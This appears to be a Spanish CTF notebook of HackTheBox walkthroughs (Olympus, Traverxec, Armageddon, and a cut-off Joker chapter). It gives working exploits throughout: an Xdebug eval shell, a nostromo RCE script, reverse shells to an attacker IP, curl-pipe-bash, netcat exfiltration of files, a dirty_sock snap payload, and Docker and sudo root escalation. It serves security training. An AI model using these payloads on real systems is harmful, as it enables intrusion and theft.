--- 
title: 2021 - S4viNotes
author: Lo0pInG 404
resume: |
  # Preface {-}
  
  ## Introducción {-}
  
  Este es el Notebook de los directos en Twitch del tito S4vitar. Aqui podreis encontrar los passos importantes de cada maquina
  echa. Este book no tiene que estar considerado como una lista de Walktrough, pero mas como unas notas de tecnicas utilizadas
  durante la resolucion de maquinas. Por cierto no estara listado las contraseñas o algunos usuarios, menos si estan utilizados en los
  comandos.
  
  Cada maquina esta separada de la manera siguiente:
  
  - Introduccion y link del directo
  - Fase de enumeracion
  - Notas sobre las vulnerabilidades econtradas
  - Explotacion de vulnerabilidades para ganar accesso a la maquina victima
  - Parte de escalacion de privilegios
  
  Espero que este book ayude a la comunidad. 
  
  Todas las notas estan disponibles separadas por tipos y categorias en el [hacking Notebook](https://looping404.michellopez.org).
  
  ## Agradecimietos {-}
  
  Me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
  Son estas ganas que me motivaron en querer aprender mas y mas. Y como la mejor manera que tengo de aprender es tomando notas,
  este book no existiria sin el.
date: updated on 2022-02-02
description: Full Pentest notebook
documentclass: book
github-repo: https://github.com/mlopez66/hacking-notes
always_allow_html: yes
bibliography: bibliography.bib
biblio-style: apalike
link-citations: yes
---




# Preface {-}

## Introducción {-}

Este es el Notebook de los directos en Twitch del tito S4vitar. Aqui podreis encontrar los passos importantes de cada maquina
echa. Este book no tiene que estar considerado como una lista de Walktrough, pero mas como unas notas de tecnicas utilizadas
durante la resolucion de maquinas. Por cierto no estara listado las contraseñas o algunos usuarios, menos si estan utilizados en los
comandos.

Cada maquina esta separada de la manera siguiente:

- Introduccion y link del directo
- Fase de enumeracion
- Notas sobre las vulnerabilidades econtradas
- Explotacion de vulnerabilidades para ganar accesso a la maquina victima
- Parte de escalacion de privilegios

Espero que este book ayude a la comunidad. 

Todas las notas estan disponibles separadas por tipos y categorias en el [hacking Notebook](https://looping404.michellopez.org).

## Agradecimietos {-}

Me gustaria dar las gracias a S4vitar por su contenido de calidad y las ganas que mete a lo que hace para la comunidad.
Son estas ganas que me motivaron en querer aprender mas y mas. Y como la mejor manera que tengo de aprender es tomando notas,
este book no existiria sin el.

<!--chapter:end:index.Rmd-->

# Olympus {-}

## Introduccion {-}

La maquina del dia 22/07/2021 se llama Olympus.

El replay del live se puede ver en [Twitch: S4vitaar Olympus maquina](https://www.twitch.tv/videos/1094808182)

<!--chapter:end:01-Olympus/01-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.83
```
ttl: 63 -> maquina linux
Recuerda que en cuanto a ttl 64 es igual a linux y 128 es igual a windows
pero como estamos en hackthebox hay un nodo intermediario que hace que disminuya el ttl en una unidad 

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.83
```

Si consideras que va muy lento, puedes utilizar los siguientes parametros para que valla mucho mas rapido
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.83 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p53,80,2222 10.10.10.83 -oN targeted
```

|Puerto|Servicio| Que se nos occure?    |    Que falta?      |
|------|--------|-----------------------|--------------------|
|53    |domain  |Domain zone transfer   |Un nombre de dominio|
|80    |http    |whatweb, http-enum     |Checkear la web     |
|2222  |ssh     |conexion a la maquina  |Usuario contraseña  |


### Empezamos por el puerto 80 {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.83
```

Nada interesante

#### Browsear la web {-}

Hay una imagen, se nos occure steganografia pero no hay nada.

El Wappalyzer no dice que el servidor web empleado es un Apache. 

#### WFuzz {-}

Como no hay mucho mas que ver, aplicaremos **fuzzing** para descubrir si hay mas rutas.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.83/FUZZ
```

No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.83/FUZZ.FUZ2Z
```

No hay nada.

#### Dig {-}

**Dig** a no confundir con dick ;) es una utilidad que nos permite recojer informaciones a nivel de dns.

1. Añadir la ip y el hostname en el /etc/hosts

    ```bash
    10.10.10.83 olympus.htb
    ```

1. Lanzar **Dig** para recojer informaciones

    ```bash
    dig @10.10.10.83 olympus.htb
    ```

No hay respuesta valida lo que quiere decir que el dominio no es valido

#### Checkear las cabezeras de las respuestas a lado del servidor {-}

```bash
curl -X GET -s "http://10.10.10.83/" -I
```

<div class="figure">
<img src="images/curl-xdebug.png" alt="curl xdebug" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-2)curl xdebug</p>
</div>

Algo interessante en la respuesta es el Xdebug 2.5.5. Xdebug es una extension de PHP para hacer debug con haremientas
depuracion tradicionales, desde el editor, tal como se hace en lenguajes de programacion clasicos. Mas informaciones sobre
Xdebug en [desarolloweb.com](https://desarrolloweb.com/articulos/que-es-instalar-configurar-xdebug.html)




<!--chapter:end:01-Olympus/01-01-Enumeration.Rmd-->

## Evaluacion de Vulnerabilidades {-}

### searchsploit {-}

Checkeamos si existe un exploit relacionado con **Xdebug 2.5.5**

```bash
searchsploit xdebug
```

Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizamos el exploit con el commando

```bash
searchsploit -x xdebug
```

Que hace el exploit?

- esta tirando de index.php
- se pone en escucha en el equipo de atacante en el puerto 9000
- usa el comando eval 
- deposita en una ruta del servidor un fichero con su contenido en base64
- ejecuta el fichero con php
- la peticion esta enviada por el methodo GET con `'Cookie' => 'XDEBUG_SESSION=+rand_text_alphanumeric(10)'`

### Pruebas del exploit {-}

1. Nos ponemos en escucha en el puerto 9000

    ```bash
    nc -nlvp 9000
    ```

1. Enviamos un peticion GET con el XDEBUG_SESSION en cookie

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

Recibimos datos del lado del servidor.

### Explotacion de la vulnerabilidad {-}

Buscamos un exploit en github y encontramos un script cortito que vamos a modificar y llamar exploit_shell.py

```python
#!/usr/bin/python3

import socket
import pdb

from base64 import b64encode

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = input('>> ')
    data = data.encode('utf-8')
    conn.sendall(b'eval -i -- ' + b64encode(data) + b'\x00')
```

1. Lanzamos el exploit

    ```bash
    python3 exploit_shell.py
    ```

1. Lanzamos una peticion GET

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

1. En la mini shell abierta del exploit_shell.py lanzamos un **whoami**

    ```php
    system('whoami')    
    ```

1. En la respuesta del **curl** se nos pone *www-data*

El exploit funciona y el comando **ifconfig** nos da una ip que no es la 10.10.10.83. Quiere decir que estamos
en un contenedor.

<!--chapter:end:01-Olympus/01-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}


### Ganando acceso con la vuln XDebug {-}

1. Nos ponemos en escucha con netcat

    ```bash
    nc -nlvp 443
    ```

1. Con el exploit exploit_shell.py lanzamos una reverse shell

    ```php
    system('nc -e /bin/bash 10.10.14.20 443')
    ```

De esta manera, hemos ganado acceso al equipo.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero de filas> columns <numero de columnas>
```

### Investigamos la maquina {-}

```bash
cd /home
#Output
zeus

ls /home/zeus
#Output
airgeddon
```

### Airgeddon.cap crack with Aircrack-ng {-}

Airgeddon es una suite de utilidades para hacer auditorias wifi. Entrando en el repertorio airgeddon del usuario zeus encontramos
otro repertorio llamado captured. Filtrando el contenido del directorio aigedon por ficheros `find \-type f` encontramos un fichero 
**captured.cap** 

Vamos a transferir el fichero captured.cap a nuestro equipo de atacante

1. En la maquina de atacante

    ```bash
    nc -nlvp 443 > captured.cap
    ```

1. En el contenedor

    ```bash
    nc 10.10.14.28 443 < captured.cap
    ```

Sabiendo que Airgeddon es una utilidad de auditoria wifi intentamos ver lo que contiene el **captured.cap** con la utilidad **aircrack-ng**.

```bash
aircrack-ng captured-cap
```

<div class="figure">
<img src="images/aircrack-airgeddon.png" alt="aircrack-ng sobre airgeddon capture" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-3)aircrack-ng sobre airgeddon capture</p>
</div>

Se ve un ESSID que se llama `To_cl0se_to_th3_Sun` que parece turbio, y un handshake que significa que alguien a esperado que una victima se connecte
o reconecte tras un ataque de deautentificacion y a recuperado el hash de autentificacion.

Analizando la captura con **tshark** se ve que a sido un ataque de deautentificacion

```bash
tshark -r captured.cap 2>/dev/null
```

o filtrado por deautentificacion

```bash
tshark -r captured.cap -Y "wlan.fc.type_subtype==12" -Tfields -e wlan.da 2>/dev/null
```

#### Crackeo con Aircrack-ng {-}

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt captrured.cap
```

Este crack duraria aprox una hora.

Con investigacion S4vi a pillado una palabra flight en un fichero .txt y buscando por el dios griego del vuelo
encontro que este dios seria icarus.

Para ganar tiempo, se crea un diccionario mas pequeñito que contiene la palabra *icar*

```bash
grep "icar" /usr/share/wordlists/rockyou.txt > dictionary.txt
```

```bash
aircrack-ng -w dictionary.txt captured.cap
```

Ya encontramos la contraseña.

#### Crackeo con John {-}

Extraemos lo que nos interesa del fichero **captured.cap** en un fichero mas pequeñito que se llama Captura.hccap que con la utilidad
**hccap2john** no permite transformarlo en un hash compatible con **John**

```bash
aircrack-ng -J Captura captured.cap
hccap2john Captura.hccap > hash
john -wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Conexion a la maquina victima{-}

Ahora que tenemos un usuario potencial y una contraseña, intentamos conectar con ssh al puerto 2222

```bash
ssh icarus@10.10.10.83
```

Con la contraseña encontrada no nos funciona.
Intentamos con el nombre turbio de esta red inalambrica como contraseña.

**Y PA DENTRO**

### Investigacion de la maquina victima {-}

Hay un fichero que contiene un nombre de dominio valido **ctfolympus.htb**

Intentamos poner el nombre del dominio en el `/etc/hosts` pero la web sigue siendo la misma.

Sabiendo que el puerto 53 esta abierto y teniendo ahora un nombre de dominio valido, podemos
hacer un ataque de transferencia de zona con **dig**

#### Ataque de transferencia de zona con dig {-}

El tito nos vuelve a decir que es muy importante no confundir la herramienta dig con dick. Dig esta en 
la categoria Ciencia y Tecnologia y la otra en la categoria HotTub ;)

```bash
dig @10.10.10.83 ctfolympus.htb
```

Como **dig** nos responde, ya podemos ir enumerando cosas

1. Enumerar los mail servers

    ```bash
    dig @10.10.10.83 ctfolympus.htb mx
    ```

1. Intentamos un ataque axfr

    ```bash
    dig @10.10.10.83 ctfolympus.htb axfr
    ```

    <div class="figure">
    <img src="images/dig-ctfolympus.png" alt="dig ctfolympus.htb" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-4)dig ctfolympus.htb</p>
    </div>

Se puede ver que hay un usuario y una contraseña potencial en un TXT con una lista de puertos.
La idea aqui seria de hacer un **Port Knocking**


### Port Knocking {-}

En este caso la idea seria conectarse al puerto 22 (es una suposicion). El problema es que este puerto esta cerrado. 
La idea de la tecnica de **Port Knocking** es que si el atacante golpea unos puertos en un orden definido, por
iptables se puede exponer o bloquear un puerto.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r
```

> [!] NOTAS: El argumento `-r` es para decir a NMAP de scanear los puertos en este mismo orden

Lanzando el comando multiples veces, NMAP nos reporta ahora que el puerto 22 esta ya abierto.
Lo que se puede hacer es, de seguida despues del **Port Knocking** con nmap, lanzar un comando
ssh a la maquina.

```bash
nmap -p3456,8234,62431,22 --open -T5 -v -n 10.10.10.83 -r && ssh prometheus@10.10.10.83
```

Perfecto se nos pregunta por una contraseña **Y PA DENTRO**

En este momento ya se puede ver la flag `user.txt` y Podemos pasar a la fase de escalacion de privilegios.

<!--chapter:end:01-Olympus/01-03-GainingAccess.Rmd-->

## Escalacion de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
whoami
id
```

Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Docker.

### Escalacion de privilegios con Docker {-}

1. Checkear las imagenes Docker existentes

    ```bash
    docker ps
    ```

1. Utilizar una imagen existente para crear un contenedor y **mountarle** la raiz del systema en el contenedor

    ```bash
    docker run --rm -it -v /:/mnt rodhes bash
    cd /mnt/root/
    cat root.txt
    ```

1. Escalar privilegios en la maquina real

    - en el contenedor

        ```bash
        cd /mnt/bin
        chmod 4755 bash
        exit
        ```
    
    - en la maquina real

        ```bash
        bash -p
        whoami

        #Output
        root
        ```


<!--chapter:end:01-Olympus/01-04-PrivilegeEscalation.Rmd-->

# Traverxec {-}

## Introduccion {-}

La maquina del dia 23/07/2021 se llama Traverxec.

El replay del live se puede ver en [Twitch: S4vitaar Traverxec maquina](https://www.twitch.tv/videos/1095841567)

<!--chapter:end:02-Traverxec/02-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.165
```
ttl: 63 -> maquina linux. 
Recuerda que en cuanto a ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.165
```

Va un poquito lento...

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.165 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.165 -oN targeted
```

|Puerto|Servicio| Que se nos occure?    |    Que falta?      |
|------|--------|-----------------------|--------------------|
|22    |ssh     |conneccion a la maquina|Usuario contraseña  |
|80    |http    |whatweb, http-enum     |Checkear la web     |


### Empezamos por el puerto 80 {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.165
```

- nostromo 1.9.6

#### Chequear la cabecera {-}

```bash
curl -s -X GET -I http://10.10.10.165
```

- nostromo 1.9.6

#### Browsear la web {-}

Nada interessante.

#### WFuzz {-}

Como no hay mucho mas que ver, aplicaremos **fuzzing** para descubrir si hay mas rutas.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ
```

No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.233/FUZZ.FUZ2Z
```

No hay nada.



<!--chapter:end:02-Traverxec/02-01-Enumeration.Rmd-->

## Evaluacion de Vulnerabilidades {-}

### searchsploit {-}

Chequeamos si existe un exploit relacionado con **nostromo 1.9.6**

```bash
searchsploit nostromo 
```

Hay un script en Python que permitiria hacer ejecucion de comandos. Nos traemos el script en el repertorio de trabajo.

```bash
searchsploit -m 47837
mv 47837.py nostromo_exploit.py
```

Analizando el script con `cat`, vemos como se uza el exploit. Intentamos reproducir los pasos antes de crearnos nuestro
proprio script.

1. En una terminal

    ```bash
    nc -nlvp 443
    ```

1. En otra terminal

    ```bash
    telnet 10.10.10.165 80
    POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
    Content-Length: 1

    whoami | nc 10.10.14.20 443
    ```

Se ve `www-data` en la primera terminal.

Ya podemos crearnos el script.


<!--chapter:end:02-Traverxec/02-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Autopwn.py {-}

```python
#!/usr/bin/python3

import requests
import sys
import signal
import pdb
import threading
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./bin/sh"
lport = 443

def makeRequest():

    data_post = {
        b'bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"'
    }

    r = requests.post(main_url, data=data_post)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    p1 = log.progress("Acceso")
    p1.status("Ganando acceso al sistema")

    shell = listen(lport, timeout=5).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible ganar acceso al sistema")
        sys.exit(1)
    else:
        shell.interactive()
```

Lo ejecutamos

```bash
python autopwn.py
whoami
#Output
www-data

ifconfig
```

El tito prefiere entablarse una shell normal. Se pone en escucha con `nc -nlvp 443` y lanza en la shell creado por el script
`bash -i >& /dev/tcp/10.10.14.20/443 0>&1`

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero filas> columns <numero columnas>
```


<!--chapter:end:02-Traverxec/02-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
cd /home
#Output
david

ls /home/david
#Output
Permisson denied

ls -l /home
#Output
drwx--x--x
```

Enumeramos el systema

```bash
cd /
id
sudo -l
find \-perm -4000 2>/dev/null
cd /var
ls
cd nostromo
cd conf
cat nhttpd.conf
cat /var/nostromo/conf/.htpasswd
```

Encontramos el hash del usuario david vamos a copiarlo en la maquina de atacante, y intentamos bruteforcear con **John**

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Encontramos una contraseña intentamos ponerla haciendo un `su david` y `su root`, pero no va. La conclusion a la que hay que llegar
es que cuando miras el fichero nhttpd.conf, dice que hay un directorio **public_www**.


### Investigacion del public_www {-}

Intentamos ver si esta en el directorio `/home/david/public_www` y efectivamente. hay un fichero comprimido y nos vamos a transferir 
a nuestro equipo de atacante.

1. En el equipo de atacante

    ```bash
    nc -nlvp 443 > comprimido.tgz
    ```

1. En el equipo victima

    ```bash
    nc 10.10.14.20 443 < backup-ssh-identity-files.tgz
    ```

Descomprimimos el archivo con el comando

```bash
7z l comprimido.tgz
7z x comprimido.tgz
7z l comprimido.tar
7z x comprimido.tar 
```

Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper.

### ssh2john {-}

```bash
ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

La contraseña de la id_rsa a sido crackeada y ya nos podemos conectar con ssh

```bash
ssh -i id_rsa david@10.10.10.165 
```

### Escalada de privilegio para root {-}

```bash
ls -l
#Output
bin

cd bin/
cat server-stats.sh
```

Vemos en este fichero que sudo puede ejecutar **journalctl**

Vamos a la pagina de [gtfobins](gtfobins.github.io) y buscamos por jounalctl

El **gtfobins** dice que hay que lanzar jounalctl con sudo y en otra linea poner `!/bin/sh`

> [!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh

Ya estamos root y seguimos mas hack que nunca.

<!--chapter:end:02-Traverxec/02-04-PrivilegeEscalation.Rmd-->

# Armageddon {-}

## Introduccion {-}

La maquina del dia 24/07/2021 se llama Armageddon.

El replay del live se puede ver en [Twitch: S4vitaar Olympus maquina](https://www.twitch.tv/videos/1096891939)

<!--chapter:end:03-Armageddon/03-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.233
```
ttl: 63 -> maquina linux. 
Recuerda que de ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.233 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.233 -oN targeted
```

- Drupal 7

|Puerto|Servicio| Que se nos occure?              |    Que falta?      |
|------|--------|---------------------------------|--------------------|
|22    |ssh     |Accesso directo                  |usuario y contraseña|
|80    |http    |Drupal-armageddon (drupalgeddon2)|Checkear el exploit |

#### Browsear la web {-}

Nada interessante.

<!--chapter:end:03-Armageddon/03-01-Enumeration.Rmd-->

## Evaluacion de vulnerabilidades {-}

### Druppalgeddon {-}

**Druppalgeddon2** es un exploit creado por Hans Topo y g0tmi1k escrito en ruby que aprovecha de vulnerabilidades
de drupal y que directamente nos daria una shell.

```bash
git clone https://github.com/dreadlocked/Drupalgeddon2
cd Drupalgeddon2
cat drupalgeddon2.rb
ruby drupalgeddon2.rb
```

<!--chapter:end:03-Armageddon/03-02-VulnerabilityAssesment.Rmd-->

## Explotacion de vulnerabilidad & Ganando acceso {-}

### Druppalgeddon {-}

```bash
ruby druppalgeddon2.rb 10.10.10.233
whoami
#Output
> apache
ifconfig
#Output
> 10.10.10.233
```

Entablamos ahora una reverse shell para sacarse de este contexto.

1. maquina de atacante

    ```bash
    nc -nlvp 443
    ```

1. druppalgeddon2 shell

    ```bash
    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

Esto no functiona porque el comando contiene **bad chars**. Como la maquina no tiene **nc** ni **ncat** la tecnica seria la siguiente:

1. Creamos un archivo *index.html* que contiene

    ```html
    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.20/443 0>&1
    ```

1. Compartimos un servidor web con *python*

    ```bash
    python3 -m http.server 80
    ```

1. En la drupalgeddon2 shell

    ```bash
    curl -s 10.10.14.20 | bash
    ```
    
ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
```

En este caso no nos va el tratamiento de la **TTY**. En este caso lo que hacemos es utilizar el `rlwrap nc -nlvp 443`

### Investigamos la maquina {-}

```bash
pwd
#Output
/var/www/html

ls -l
#Output
muchas cosas

grep -r -E -i "user|pass|key"
#Output
muchas cosas

grep -r -E -i "username|pass|key"
#Output
muchas cosas
```

Como hay muchas cosas y es dificil de analizar usamos el comando `find` y vamos quitando con el comando `grep -v` las cosas que no 
nos interresan poco a poco.

```bash
find \-type -f 2>/dev/null
find \-type -f 2>/dev/null | grep -v "themes"
find \-type -f 2>/dev/null | grep -v -E "themes|modules"
```

Ahora ya se puede investigar manualmente. Apuntamos los recursos que parecen interesantes.

- authorize.php
- cron.php
- includes/database
- includes/password.inc
- sites/default/

Lo miramos hasta que encontremos cosas interesantes. En un fichero encontramos un user **drupaluser** y su contraseña.

Miramos los usuarios de la maquina 

```bash
grep "sh$" /etc/passwd
#Output
root
brucetherealadmin
```

Como el servicio ssh esta abierto miramos si la contraseña functiona con el usuario brucetherealadmin pero no functiona.

Como hemos visto ficheros *mysql* intentamos conectar con el **drupaluser** y functiona.

```bash
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'show databases;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; show tables;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; describe users;'
mysql -u 'drupaluser' -p "SLKDENkldajsn!!$" -e 'use drupal; select name,pass from users;'
```

Encontramos el usuario 'brucetherealadmin' y su contraseña encryptada.

### John {-}

1. copiamos el hash en un fichero llamado `hash`
1. john --wordlist=/usr/share/wordlists/rockyout.txt hash

Ya tenemos contraseña para el usuario *brucetherealadmin*

### SSH {-}

```bash
ssh brucetherealadmin@10.10.10.233
```

ya tenemos la flag user.txt

<!--chapter:end:03-Armageddon/03-03-GainingAccess.Rmd-->

## Escalada de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
whoami
id
sudo -l
```

Vemos que podemos lanzar snap como root.

Buscamos en google snap hook exploit .snap file y encontramos el link siguiente 
[Linux Privilege Escalation via snapd (dirty_sock exploit)](https://initblog.com/2019/dirty-sock/). Econtramos
un hook que genera un nuevo local user. Lo miramos y lo reutilizamos usando python.

```bash
echo "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" | xargs | tr -d ' '
```

copiamos el output y recreamos el paquete snap malicioso

```bash
cd /tmp
pytho -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD
//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29
jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1
EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2Q
gLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N
1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciB
leHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiA
gJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAA
BaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3F
qfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4
wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRj
NEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPt
vjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAA
AAAAAPgMAAAAAAAAEgAAAAACAA" + "A"*4256 + "=="' | base64 -d > setenso.snap

sudo /usr/bin/snap install setenso.snap --devmode
cat /etc/passwd
sudo dirty_sock > password dirty_sock
sudo su > password dirty_sock

whoami
#Output
root
```

<!--chapter:end:03-Armageddon/03-04-PrivilegeEscalation.Rmd-->

# Joker {-}

## Introduccion {-}

La maquina del dia 26/07/2021 se llama Joker.

El replay del live se puede ver en [Twitch: S4vitaar Joker maquina](https://www.twitch.tv/videos/1098850596)

<!--chapter:end:04-Joker/04-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.21
```
ttl: 63 -> maquina linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.21 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.21 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,3128 10.10.10.21 -oN targeted
```

|Puerto|Servicio    | Que se nos occure?              |    Que falta?      |
